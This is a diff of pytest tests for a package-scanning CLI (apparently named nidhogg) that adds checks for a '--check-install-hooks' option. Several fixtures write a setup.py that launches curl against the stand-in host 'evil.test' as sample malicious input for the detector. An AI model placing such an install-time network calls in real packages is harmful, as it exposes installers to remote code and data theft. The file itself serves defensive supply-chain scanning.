@@ -86,6 +86,9 @@ def test_main_analyze_uses_default_history_dir_when_omitted(
 ):
     pkg_dir = tmp_path / "pkg"
     pkg_dir.mkdir()
+    (pkg_dir / "mod.py").write_text(
+        'URL = "http://totally-not-benign.test"\n', encoding="utf-8"
+    )
     default_dir = tmp_path / "default-history"
 
     monkeypatch.setattr(history_module, "default_history_dir", lambda: default_dir)
@@ -101,6 +104,9 @@ def test_main_analyze_uses_default_history_dir_when_omitted(
 def test_run_analyze_appends_to_history(tmp_path: Path):
     pkg_dir = tmp_path / "pkg"
     pkg_dir.mkdir()
+    (pkg_dir / "mod.py").write_text(
+        'URL = "http://totally-not-benign.test"\n', encoding="utf-8"
+    )
     history_dir = tmp_path / "history"
     exit_code = _run_analyze(
         pkg_dir,
@@ -174,6 +180,9 @@ def test_run_fetch_returns_error_on_download_failure():
 def test_run_fetch_writes_history(tmp_path: Path):
     extracted = tmp_path / "extracted"
     extracted.mkdir()
+    (extracted / "mod.py").write_text(
+        'URL = "http://totally-not-benign.test"\n', encoding="utf-8"
+    )
     history_dir = tmp_path / "history"
 
     @contextmanager
@@ -704,6 +713,9 @@ def test_run_analyze_skips_binaries_by_default(tmp_path: Path):
     pkg_dir = tmp_path / "pkg"
     pkg_dir.mkdir()
     (pkg_dir / "helper.dll").write_bytes(b"garbage")
+    (pkg_dir / "mod.py").write_text(
+        'URL = "http://totally-not-benign.test"\n', encoding="utf-8"
+    )
     history_dir = tmp_path / "history"
 
     exit_code = _run_analyze(
@@ -712,8 +724,7 @@ def test_run_analyze_skips_binaries_by_default(tmp_path: Path):
 
     assert exit_code == 0
     binaries_files = list((history_dir / "binaries").glob("*.jsonl"))
-    document = json.loads(binaries_files[0].read_text().splitlines()[0])
-    assert document["binaries"] == []
+    assert binaries_files == []
 
 
 def test_run_analyze_writes_binaries_sibling_file(tmp_path: Path):
@@ -764,3 +775,122 @@ def test_run_fetch_appends_binaries_to_history(tmp_path: Path):
     assert len(binaries_files) == 1
     document = json.loads(binaries_files[0].read_text().splitlines()[0])
     assert document["binaries"][0]["name"] == "helper.dll"
+
+
+def test_build_parser_check_install_hooks_defaults_false():
+    parser = _build_parser()
+    args = parser.parse_args(["analyze", "some/path"])
+    assert args.check_install_hooks is False
+
+
+def test_build_parser_check_install_hooks_flag_sets_true():
+    parser = _build_parser()
+    args = parser.parse_args(["analyze", "some/path", "--check-install-hooks"])
+    assert args.check_install_hooks is True
+
+
+def test_build_parser_fetch_check_install_hooks_flag_sets_true():
+    parser = _build_parser()
+    args = parser.parse_args(["fetch", "somepkg", "--check-install-hooks"])
+    assert args.check_install_hooks is True
+
+
+def test_build_parser_monitor_check_install_hooks_flag_sets_true():
+    parser = _build_parser()
+    args = parser.parse_args(["monitor", "--check-install-hooks"])
+    assert args.check_install_hooks is True
+
+
+def test_run_analyze_appends_install_hooks_to_history(tmp_path: Path):
+    pkg_dir = tmp_path / "pkg"
+    pkg_dir.mkdir()
+    (pkg_dir / "setup.py").write_text(
+        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
+    )
+    history_dir = tmp_path / "history"
+
+    exit_code = _run_analyze(
+        pkg_dir,
+        None,
+        as_json=False,
+        verbose=False,
+        history_dir=history_dir,
+        check_install_hooks=True,
+    )
+
+    assert exit_code == 0
+    install_hooks_files = list((history_dir / "install_hooks").glob("*.jsonl"))
+    assert len(install_hooks_files) == 1
+    document = json.loads(install_hooks_files[0].read_text().splitlines()[0])
+    assert document["install_hooks"][0]["call"] == "subprocess.Popen"
+
+
+def test_run_analyze_skips_install_hooks_by_default(tmp_path: Path):
+    pkg_dir = tmp_path / "pkg"
+    pkg_dir.mkdir()
+    (pkg_dir / "setup.py").write_text(
+        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
+    )
+    history_dir = tmp_path / "history"
+
+    exit_code = _run_analyze(
+        pkg_dir, None, as_json=False, verbose=False, history_dir=history_dir
+    )
+
+    assert exit_code == 0
+    install_hooks_files = list((history_dir / "install_hooks").glob("*.jsonl"))
+    assert install_hooks_files == []
+
+
+def test_run_analyze_writes_install_hooks_sibling_file(tmp_path: Path):
+    pkg_dir = tmp_path / "pkg"
+    pkg_dir.mkdir()
+    (pkg_dir / "setup.py").write_text(
+        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
+    )
+    output = tmp_path / "out.json"
+
+    exit_code = _run_analyze(
+        pkg_dir, output, as_json=False, verbose=False, check_install_hooks=True
+    )
+
+    assert exit_code == 0
+    doc = json.loads((tmp_path / "out.install_hooks.json").read_text())
+    assert doc["install_hooks"][0]["call"] == "subprocess.Popen"
+
+
+def test_run_fetch_appends_install_hooks_to_history(tmp_path: Path):
+    extracted = tmp_path / "extracted"
+    extracted.mkdir(parents=True)
+    (extracted / "setup.py").write_text(
+        "import subprocess\nsubprocess.Popen(['curl', 'http://evil.test'])\n"
+    )
+    history_dir = tmp_path / "history"
+
+    @contextmanager
+    def _fake_fetched_package(
+        name,  # noqa: ARG001
+        version=None,  # noqa: ARG001
+        *,
+        keep=False,  # noqa: ARG001
+        keep_dir=None,  # noqa: ARG001
+    ):
+        yield extracted, "1.0", "https://example.com/pkg-1.0.tar.gz"
+
+    with patch("nidhogg.fetching.pypi_fetch.fetched_package", _fake_fetched_package):
+        exit_code = _run_fetch(
+            "somepkg",
+            None,
+            None,
+            as_json=False,
+            verbose=False,
+            keep_download=None,
+            history_dir=history_dir,
+            check_install_hooks=True,
+        )
+
+    assert exit_code == 0
+    install_hooks_files = list((history_dir / "install_hooks").glob("*.jsonl"))
+    assert len(install_hooks_files) == 1
+    document = json.loads(install_hooks_files[0].read_text().splitlines()[0])
+    assert document["install_hooks"][0]["call"] == "subprocess.Popen"
